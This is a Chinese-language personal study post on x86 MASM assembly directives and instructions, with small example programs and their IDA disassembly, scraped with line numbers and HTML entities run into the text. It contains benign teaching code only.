返回的结果是21,字符串长度+1,那个1是0的占位 typedef 定义新的类型可以与C语言联想 但是不同于C语言 C语言 typedef+原来的类型+新的类型 1typedef char *ptr B_ptr x86汇编 新的类型+typedef+老的类型 1B_ptr typedef ptr byte 1234567891011121314151617title Dqx_Gh0st.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD\tdb_ptr typedef ptr bytedw_ptr typedef ptr word.data\tarr1 db 9,8,7,6,5,4,3,2\tarr2 dw 9,8,7,6,5,4,3,2,1\tptr1 dd arr1 ptr2 dd arr2.codemain PROC\t...................... $ 地址计数器12345678910111213141516;------------------------------------------------------------------------x=100.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD .data\ttemp dd $\t;偏移地址的长度data:00405000,可见它是一个4字节的长度,我们要用dd来获取.codemain PROC mov eax,temp;eax就获取了temp的偏移地址\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main 于是你在IDA里面看到的 12345sub_402028 proc nearmov eax, off_405000push 0 ; uExitCodecall j_ExitProcesssub_402028 endp temp直接就转化为了一个地址的变量名称 以前的变量名称是temp 写在变为了off_405000 40500就是偏移地址 源代码的data 12.data\ttemp dd $ IDA里面是 12.data\toff_405000 dd offset off_405000 获取当前位置的偏移地址123.data\tArr db 1,2,3,4,5,6,7,8,9,10\tArr_end dd $ Arr_end就是它的当前的偏移地址 就是获取一个偏移地址,至于后面怎么样再说 计算数组长度简要介绍计算数组的长度 数组的第一个元素会有一个偏移量 数组的最后一个元素也会有一个偏移量 123.data\tArr db 1,2,3,4,5,6,7,8,9,10\tArr_end dd $ 1234567891011.data:00405000 unk_405000 db 1 ; Arr.data:00405001 db 2.data:00405002 db 3.data:00405003 db 4.data:00405004 db 5.data:00405005 db 6.data:00405006 db 7.data:00405007 db 8.data:00405008 db 9.data:00405009 db 14h.data:0040500A dd offset unk_405000;Arr_end不太理解IDA里面为什是offset unk_405000,而不是offset unk_40500A Arr -&gt;xxxx5000 Arr_end-&gt;xxxx500A 0xA-0x0&#x3D;10 于是就有10个数据 你可能会想到10个元素 最后一个元素index&#x3D;9, 第一个元素 index&#x3D;0 9-0&#x3D;9 得到数字9 你也知道这样得到的数据是不对的,9只是[0]和[9]的差量 len&#x3D;10是[10]和[0]的差量 源码 1234567891011121314151617;------------------------------------------------------------------------x=100.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD .data\tArr db 1,2,3,4,5,6,7,8,9,10\tArr_end dd $.codemain PROC mov ax,Arr_end-Arr\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main IDA 12345sub_402028 proc nearmov ax, 10push 0 ; uExitCodecall j_ExitProcesssub_402028 endp 一般情况更加常见的的计算方式 1234567891011121314151617;------------------------------------------------------------------------x=100.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD .data\tArr db 1,2,3,4,5,6,7,8,9,10\tlen dd $-Arr.codemain PROC mov eax,len\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main IDA data 1234567891011.data:00405000 db 1.data:00405001 db 2.data:00405002 db 3.data:00405003 db 4.data:00405004 db 5.data:00405005 db 6.data:00405006 db 7.data:00405007 db 8.data:00405008 db 9.data:00405009 db 0Ah.data:0040500A dword_40500A dd 10 code 12345sub_402028 proc nearmov eax, dword_40500A;也就是10push 0 ; uExitCodecall j_ExitProcesssub_402028 endp 其它类型数组 db len&#x3D;($-Arr) dw len&#x3D;($-Arr)&#x2F;2 dd len&#x3D;($-Arr)&#x2F;4 …. &#x3D; 等号指令&#x3D;指令的对象是一个32位长度的数据 它的优点….利于代码的维护与修改 在我对C语言或者C++不明白的情况下 我觉得=指令给我的感觉就是一个全局的变量 无论你在后面赋值还是前面赋值,系统都可以为你找到数据然后赋值 123456789101112131415;------------------------------------------------------------------------.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD .codemain PROC mov eax,x\tINVOKE\tExitProcess,0;调用结束的函数,\tx=100;--------------------------------------------------------------------------- main ENDPEND main 或者 123456789101112131415;------------------------------------------------------------------------x=100.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD .codemain PROC mov eax,x\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main 无论怎么样.在IDA里面都是 12345proc near ; CODE XREF: start↑jmov eax, 100push 0 ; uExitCodecall j_ExitProcessendp 加深一下理解 1234567891011121314151617;------------------------------------------------------------------------x=1.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD .codemain PROC xor eax,eax x=100 mov eax,x x=1000 mov eax,x\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main 在DIA里面 1234567proc near ; CODE XREF: start↑jxor eax, eaxmov eax, 100mov eax, 1000push 0 ; uExitCodecall j_ExitProcesssub_402028 endp high&#x2F;low&#x2F;highword&#x2F;lowword他可以取出高8位,低8位,高16位,低16位的数据 他的操作数是立即数,不是变量,不是寄存器 1234567891011121314151617181920include Dqx.inc\t.data.codestart: xor eax,eax\txor ebx,ebx\tmov ah,high 1234h\tmov al,low 1234h\tmov ax,highword 12345678h\tmov ax,lowword 12345678h INVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- end start IDA 1234567891011public startstart proc nearxor eax, eaxxor ebx, ebxmov ah, 12hmov al, 34h ; &#x27;4&#x27;mov ax, 1234hmov ax, 5678hpush 0 ; uExitCodecall ExitProcessstart endp 运算符优先级（1）LENGTH,SIZE,WIDTH,MASK. (),[],(结构体),&lt;&gt;。（2）PTR,OFFSET,TYPE,SEG,THIS,冒号。冒号用于表示段超越前缀。（3）*，&#x2F;，MOD，SHL,SHR（4）HIGH,LOW（5）+，-（6）EQ,NE,LT,LE,GT,GE（7）NOT（8）AND（9）OR,XOR（10）SHORT 非伪指令字节对齐在C语言下,字节对齐可以自己规定 123456#pragma pack(1)struct str&#123;&#125;#pragma pack() 每个成员所占空间是字节对齐的倍数,不足就补0 align可以联想一下nop,这里的algin会填充空字节,也就是填充0 然后algin的原理是个啥 最后的结果就是让下一个数据的地址是1&#x2F;2&#x2F;4&#x2F;8&#x2F;16的倍数 好比 123456789db1 byte\t1db2 byte\t2align\t4 ;让dw1的地址是4的倍数 dw1 word 3 align\t2 ;让dd1的地址是2的倍数dd1 dword\t4dd2 dword\t5align\t4 ;让db3的地址是4的倍数db3 byte\t6 为了得到这些倍数,他就通过在前面补充0来填充字节 另外之一下 align 4 不是说真的填充4字节 align 16 也不是说填充16字节 可能还是填充2字节,4字节,,看地址情况而定 algin的主要功能之一 16&#x2F;32位 字节对齐 这对寻址很有帮助 alignbBCD码指令-&gt;fld,fbstp见&lt;&lt;汇编语言基于x86处理器&gt;&gt;的Page-60 inc&#x2F;dec&#x2F;add&#x2F;sub自己百度 dup 数据重复db 128 dup(0)表示重复128个1,单位字节 db 128 dup(‘1’)表示重复128个字符’1’,单位字节 db 128 dup(?) 表示没有初始化 offset 就取处偏移地址他的对象是一个常数地址,不会发生变化,编译器遇到offset就会寻找那个偏移地址,然后ofset xxx = 地址常量 为什么? offset 用于全局变量 全局变量是不会消失的 所以offset的操作数是一个全局的常量 在编译阶段直接由编译器赋值 在之前我们有这样的写法 8086中,只能把数组写到代码段寻址 12345code segment\tArr1 db 1,2,3,4start:\t....\tmov si,Arr1 于是我们就可以获取偏移地址 在x86中,可以把数组写进data段 1234.data\tArr1 db 1,2,3,4.code\tmov ax,[Arr1+1] 于是我,们就可以直接把数组名当中地址来用 为了更加的严谨.利于代码的阅读性与维护性 我们用offset 123456789.data\tArr1 db 1,2,3,4\tptr_arr dd Arr1.codemain PROC\tmov esi,offset Arr1;我感觉offset的就像C语言的取地址运算符&amp;\tmov edi,ptr_arr;一个指针,\tmov al,[esi]\tmov ah,[edi] offset返回的数据是一个对应位数的偏移地址 8086的offset返回2字节 x86的offset返回4字节 lea 取地址不同于offset,offset是编译是直接获取的常量地址 lea是运行时动态的算出每一次地址 1lea Des,Src lea eax,dword ptr ds:[ebx] 其中eax&#x3D;ebx ptr 重写操作数大小类型8686下 1mov ax,arr[1*2] ax就决定了数组的数据长度 x86下就离谱 12mov ax, byte ptr ptr1[1*(type arr1)]mov ax, word ptr ptr2[1*(type arr2)] 非要这样写,否者就报错 对于一个好比4字节的数据 你可以对它的2个字节2个字节的访问 或者8个字节8个字节的访问,这就会访问4字节后面的4字节 1234567891011121314151617181920;------------------------------------------------------------------------.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD .data\tx dw 4321h\ty dw 8765h.codemain PROC xor eax,eax\tmov eax,dword ptr x\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main IDA 12345678; Attributes: noreturnsub_652028 proc nearxor eax, eaxmov eax, dword_654000push 0 ; uExitCodecall j_ExitProcesssub_652028 endp 最后EAX&#x3D;87654321h xchg 交换指令xchg x,y那么x,y的数据会交换 如何交换2个数?还是要用到第3者 对于操作数,必须2个必须是可读可写的变量 way1-我自己想的 123xchg x,eax xchg y,eax xchg x,eax way-2 123mov eax,xxchg y,eaxmov x,eax way-3 123mov temp,xmov x,ymov y,temp call本质是 12push next_IPjmp call_func_location 回归到CPU执行指令的原理 读取当前指令到BUFF IP&#x3D;下一个IP CPU执行BUFF 那么的话,当我们执行了Call会,IP&#x3D;下一个IP 那么的话call会就会push下一个指令的ip 12345678910111213141516call s 然后会push ipret 然后会pop ipcall far ptr 然后会push cspush ipretf然后会pop ip, pop cs 对一般的call 它就是push一些东西 然后再 jmp 到 call 的那个地址 再次说一遍,我们是push 地址,不是push一个指令 对far ptr push cs push ip 对于数据,肯定还要pop 就是 pop ip pop cs call word ptr ds:[xx] 会 push ip call dword ptr ds:[xx] 会push cs, push ip loop loop的代码执行效率会比jmp慢,所以在实际的调试时,很少出现loop,都是一些条件跳转 loop也有很多的形式 他们对计数器的要求会不同 他们对程序的指令的兼容性也会不同 遇到就查吧 add会偷偷修改标志寄存器 所以在使用寄存器的时候你要注意那些寄存器的变化 判断是否循环的原则 先对ecx&#x2F;cx作运算 然后看是否为0 123456789101112assume cs:codecode segment mov ax,0 mov cx,4func: add ax,2 loop func mov ax,4c00h int 21hcode endsend 对于嵌套的LOOP循环,要记住push cx和pop cx,并且注意中途少用cx 对于这种机制,要注意的是 高级语言往往是先检验是否为0,再执行cx-1 Loop是先执行cx-1,再去判断 123456mov ecx,0add_sum:\tadd eax,arr[esi]\tinc esi\tloop add_sum 它会是一个很大的循环 一直到ecx发生溢出或者进位,他就为0了 cmpxchg他有2个操作数 1cmpxchg x,y 用高级语言解释一下 123456789101112if(eax==x)&#123; x=y; ZF=1;&#125;\telse&#123; eax=x; ZF=0;&#125; 在我的电脑上无法运行该指令 bsr&#x2F;bsf 位扫描 数值的下标是这样安排的 最右边是index&#x3D;0 最左边是index&#x3D;xx 字符串的下标 做左边是index&#x3D;0 最右边是index&#x3D;xx bsf :Bit Scan Forward bsr :Bit Scanf Reverse 反汇编会被翻译为函数 1_BitScanReverse() bsf指令的功能: 从右往左扫描,正向寻取 二进制值的&#x3D;&#x3D;最低位的1&#x3D;&#x3D;的index,返回index,然后初始化ZF的值 bsr指令的功能: 从左往右扫描 逆向寻取 寻取二进制值的&#x3D;&#x3D;最低位的1&#x3D;&#x3D;的index,返回index,然后初始化ZF的值 如果找到1,说明value!&#x3D;0,那么ZF&#x3D;0 如果找不到1,,说明value&#x3D;&#x3D;0,那么ZF&#x3D;1 好比1101, 用bsr寻取到index&#x3D;3,最左边是[3]&#x3D;1 用bsf寻取到index&#x3D;0,最右边是[0]&#x3D;1 这不同于字符串的index 1bsr ecx ,vale 那么他就把value的1值最高位返回给ecx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx bswap 字节反向存储好比 mov eax,12345678h bswap eax eax&#x3D;78563412h return返回虽然本质是pop ip 其实我们可以在栈里面修改它那个ip,然后在pop出去 这就很妙 ret近转移本质是pop ip 他是近转移 ret 后面也可以带参数 ret 8 masm32下表示 12pop ip add esp+8 retn 近转移意思是ret near retn操作：pop eip retn N操作：先pop eip，然后add esp,N retn 其实等价于 ret retf 远转移他是段间转移 可以修改CS:IP 先pop IP 后pop CS 因为之前有push cs,push ip 把栈顶的word数据给IP 又把下一个栈顶word数据给CS iret 中断返回中断过程中的iret 他会实现 pop ip pop cs popf 二进制第i位操作从右往左寻找二进制的1 bt1bt eax,2 把eax的第[2]位传递给CF,然后,[2]位不变 1_bittest() btc1btc eax,2 将eax的第[2]传递给CF,把[2]取反 btr1btr eax,2 把eax的第[2]位给CF,然后置[2]位为0 bts1bts eax,2 把eax的第[2]位给CF,然后置[2]位为1 CPU控制指令nop该指令的执行不会影响任何标志寄存器 wait让CPU处于等待状态,直到协处理器完成运算 问题来了,什么叫协处理器 hlt 暂停指令执行了hlt后,CPU处于暂停的工作状态, EIP指向HLT的下一条指令 把EIP入栈 当产生了reset信号或者中断请求信号时,才会eip出栈,CPU继续执行 关于中断的产生,CPU强制去执行中断 CPU转去处理中断程序后,中断结束,iret弹出EIP,并唤醒HLT的下一条指令,这样CPU退出了暂停 所以这个IRET还是强大呀 lock 封锁数据它是一个前缀指令 就像rep movsb指令套 lock会跟一个操作指令 lock可以保证在其后指令的执行过程中,禁止协处理器修改数据总线 起到单独占线的占用,该指令不会影响寄存器 cpuid 获取CPU信息这应该与端口相关吧…. x86模式下 初始化eax,然后调用cpuid在最后在ebx&#x2F;edx&#x2F;ecx检查该值 x64模式下 初始化eax,然后调用cpuid在最后在ecx&#x2F;edx中检查该值 123456789101112131415161718192021222324252627#include&lt;stdio.h&gt;#include&lt;windows.h&gt;unsigned long getcpu(char*);int main()&#123;\tchar b_str[128]=&#123;0&#125;;\tunsigned long ret=getcpu(b_str);\tprintf(&quot;ID:%u %s&quot;,ret,b_str);\tsystem(&quot;pause&quot;);\treturn 0;&#125;unsigned long getcpu(char* b_str)&#123;\t__asm\t&#123; mov eax,0 cpuid mov eax,b_str mov [eax],ebx mov [eax+4],edx mov [eax+8],ecx mov eax,1 cpuid mov eax,edx\t&#125;&#125; 条件跳转一般汇编语言的跳转判断是根据指定条件的相反条件 若满足相反条件就就指向else 否则顺序执行后面的语句 浮点数的比较 fcomp会影响FPU的寄存器 fcomi指令字节影响CPU的eflag jmp原理CPU如何指令命令? CPU从CS:IP读取指令到buff IP&#x3D;IP+刚才读取的指令长度 于是IP指向了下一条指令 CPU执行buff的指令 CPU又开始读取IP,循环操作上面的操作 机器码剖析 那么jmp的话 就是 EB xx 那个xx就是一个偏移地址,这个偏移地址的基地址是jmp后面那个指令的开始字节,从字节数0开始数 然后,偏移到jmp的地方 xx快速计算的方法就是 跳到那里的地址-jmp后的那个IP&#x3D;xx xx是一个有符号的数值 比如0x00-0xFF 其中0x00-0x7F是往前跳 0x7F-0xFF是往后面跳 其它jmp jmp far ptr 段间转移 跳转范围 -32768~32767 jmp short ptr 段转移 跳转的范围小于128字节 jmp word ptr ds:[0]\t会取ds: [0] [1] 位ip地址 jmp dword ptr ds:[1] 取[0] [1]为ip,[2] [3]为cs jmp byte ptr ds:[1] cmp-有符号&#x2F;无符号对于数值的cmp &#x3D;&#x3D;你若看作是无符号比较,就只看ZF&#x3D;&#x3D; &#x3D;&#x3D;你若看作有符号的比较,就看SF&#x2F;OF,或者ZF&#x3D;&#x3D; CPU将cmp指令得到的结果记录在flag的相关标志位中，我们可以根据指令执行后，相关标志位的值来判断比较的结果。单纯的考察SF的值不可能知道结果的正负 1234567891011cmp al,blSF=1,OF=0 al&lt;blSF=1,OF=1 al&gt;bl SF=OF如果因为溢出导致的实际结果为负数,那么真正的结果为正数SF=0,OF=1 al&lt;blSF=0,OF=0 al&gt;nl SF==OF如果因为溢出导致的实际结果为正数,那么真正的结果为负数OF==SF 才会有大于 je 相等就跳转 jne 不相等就跳转 jb jmp blow 小于就跳转 jnb jmp not blow 大于等于就跳转 ja jmp above 大于就跳转 jna jmp not above 小于等于就跳转 eflag跳转 助记符 说明 标志位&#x2F;寄存器 JZ 为零跳转 ZF&#x3D;1 JNZ 非零跳转 ZF&#x3D;0 JC 进位跳转 CF&#x3D;1 JNC 无进位跳转 CF&#x3D;0 JO 溢出跳转 OF&#x3D;1 JNO 无溢出跳转 OF&#x3D;0 JS 有符号跳转 SF&#x3D;1 JNS 无符号跳转 SF&#x3D;0 JP 偶校验跳转 PF&#x3D;1 JNP 奇校验跳转 PF&#x3D;0 STC 让CF&#x3D;1 CLC 让CF&#x3D;0 CMC 让CF取反 相等跳转用cmp判断 助记符 说明 JE&#x2F;JZ 相等跳转 (leftOp&#x3D;rightOp) JNE&#x2F;JNZ 不相等跳转 (leftOp M rightOp) JCXZ CX&#x3D;0 跳转 JECXZ ECX&#x3D;0 跳转,你在8086用的比较多 JRCXZ RCX&#x3D;0 跳转（64 位模式） 无符号跳转above&#x2F;below 助记符 说明 JA&#x3D;JNBE &gt; CF|ZF&#x3D;0 JB&#x3D;JNAE &lt; CF&#x3D;1 JAE&#x3D;JNB &gt;&#x3D; CF&#x3D;0 JNA&#x3D;JBE &lt;&#x3D; CF|ZF&#x3D;1 有符号的跳转greate&#x2F;little 助记符 说明 JG&#x3D;JNLE &gt; (SF ^OF)|ZF&#x3D;0 JL&#x3D;JNGE &lt; SF^OF&#x3D;1,意思SF &#x3D; OF JGE&#x3D;JNL &gt;&#x3D; SF ^ OF&#x3D;0,意思是SF! &#x3D; OF JLE&#x3D;JNG &lt;&#x3D; (SF^OF)|ZF&#x3D;1 测试条件转存指令条件跳转的应用举个例子al是8位 把8位当作开关,于是我们来检测 某一位是否开启1234test al,10000000bjnz\txxx//开启了就ZF!=0,//没开启,ZF==1 对于10001000b 0位数据不管,检测那个1位,如果他也为1,那么最后ZF&#x3D;0.否则为1 某几位当中是否有任意一位开启12test al,10010001bjnz\txxx 只要开启了一位,最后的ZF&#x3D;0,都没有开启就会ZF&#x3D;1 某几位都开启要用减法 123and al,10010001bcmp al,10010001bjz\txxx and把无关的位数都屏蔽了,留下了要检测的 然后一个cmp,如果都开启,最后结果就是0,ZF&#x3D;&#x3D;1 求3个数的最小值假设x,y,z 12345678910mov eax,xcmp eax,yjbe nextmov eax,ynext:cmp\teax,zjbe\tendmov\tresult,zend:mov\tresult,eax 数的比较char x&#x3D;0xffchar y&#x3D;0x1比较x&#x2F;y x&lt;y unsigned char x&#x3D;0xffunsigned char y&#x3D;0x1比较x&#x2F;y x&gt;y 在数的比较中,我们会对其进行扩展 好比8位的比较变化位32位了 无符号的比较也可能用来有符号的跳转,可能涉及了符号的扩展 条件测试+与循环语句条件测试.if&#x2F;.elseif&#x2F;.endif&#x2F;.else一个基本的条件循环是 123.if.endif 2面性判断 12345.if.else.endif 多面性判断 1234567.if.elseif.elseif.endif 这些if语句会与跳转指令相挂钩 简介条件测试语句? 就是逻辑条件的判断… masm条件测试的几个限制 表达式左边只能是常量&#x2F;寄存器 表达式2边不能同时是变量,可以是寄存器 另外表达式中不能是算术表达式,好比x*y&gt;0 ;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 一些标志寄存器的伪指令 12345.if carry.if overflow.if parity.if sign.if zero 条件的测试语句的伪指令见后面的目录 1.if eax &amp;&amp; (ebx&gt;=var) || !(var!=ecx); 这句话实现有很多个跳转 这句判断的判断是一个顺序的结构 eax&#x3D;0,跑去判断var!&#x3D;ecx, eax&#x3D;1,就去判断ebx&gt;&#x3D;var,如果是,就直接跳过后面的判断,直接执行 eax&#x3D;1,就去判断ebx&gt;&#x3D;var,如果不是,就去判断var!&#x3D;ecx,然后看是否要执行 所以这个判断还是有很多的jmp&#x2F;jnz&#x2F;jz的 很头疼 天坑1️⃣ 关于那些条件条件跳转 他们也有sign与unsigned之分, 好比无符号的jb&#x2F;jnb mov eax,1 jb eax,-1 那么的话-1是一个很大的值 对于无符号的比较指令好像书上写了 见cmp指令的跳转指令\\ 怎么在源代码里面避免这些情况??? 办法一是把数据类型改为有符号的数,好比sword 办法二,强制类型转化 12.if sword ptr eax &gt;0.if eax &gt; sword ptr 0 2️⃣ 条件指令就那几个 注意在前面加上点.,否则他就成为了宏指令 代码示意可以调试一下它!!!!巨离谱 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 使用 nmake 或下列命令进行编译和链接:; ml /c /coff Hello.asm; Link /subsystem:windows Hello.obj;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; Include 文件定义;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include windows.incinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.lib;对于上面的lib,inc还不是很理解;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 数据段.data;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;var\tdd\t20;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 代码段.code;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; start: xor eax,eax .if eax &amp;&amp; (ebx&gt;=var) || !(var!=ecx);把前面看作一个部分,如果前面2个返回1,那么后面就不在判断 mov esi,1 .elseif edx mov esi,2 .elseif\tesi &amp; 1 mov esi,3 .elseif\tZERO? &amp;&amp; CARRY? mov esi,4 .endif push 0 call ExitProcess;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 循环语句while&#x2F;endw&#x2F;repeat&#x2F;until&#x2F;untilcxz&#x2F;continue&#x2F;break 搭配 while-endw repeat-until repeat-untilcxz while+表达式 表示一个循环执行的条件 一次循环结束就jmp到while那里再次判断是否执行 break&#x2F;continue就类别C语言就可以了,用于中途的跳出… break到哪里去?while循环外的第一条语句 continue不会执行后面的代码,会jmp到循环开始的while until+一个表达式 这个表达式是结束的表达式,也就是循环到什么时候结束 untilcxz是一个loop的盗版,他会ecx-&#x3D;1,判断ecx是否为0,然后执行loop一样的操作 它也可以接上一个表达式,那么的话,循环🔚的条件就变为了2个 loop指令不会影响标志寄存器的,是一个很好的选择 关于循环语句的伪指令见指令那一章节 例子123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 使用 nmake 或下列命令进行编译和链接:; ml /c /coff Hello.asm; Link /subsystem:windows Hello.obj;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; Include 